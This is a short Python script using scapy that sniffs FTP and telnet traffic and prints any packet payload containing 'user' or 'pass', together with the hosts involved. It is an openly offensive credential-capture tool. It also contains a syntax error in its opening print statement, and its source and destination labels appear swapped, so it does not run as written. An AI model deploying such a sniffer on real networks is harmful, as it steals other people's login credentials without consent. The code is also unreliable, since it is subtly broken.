#!/usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import print_function
import sys
from scapy.all import *


def check_packet_detail(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        if packet[TCP].dport == 21 or packet[TCP].sport == 21:
            return 'FTP'
        elif packet[TCP].dport == 23 or packet[TCP].sport == 23:
            return 'telnet'
        else:
            return False

def check_packet(packet):
    app = check_packet_detail(packet)
    if app:
        pass
    else:
        return
    data = packet[Raw].load
    if 'user' in data.lower() or 'pass' in data.lower():
        print('[*] %s packet capture was successful' % app)
        print("\t[*] Server: %s -> %s" % (packet[IP].dst, packet[IP].src))
        print("\t  [*] %s" % packet[TCP].payload)

if __name__ == '__main__':
    print('[*] Sniffing Started ...' % )

    try:
        sniff(prn=check_packet, store=0)
    except Exception:
        print('[!] Error: Failed to Initialize Sniffing')
        sys.exit(1)

    print('[*] Sniffing Stopped')
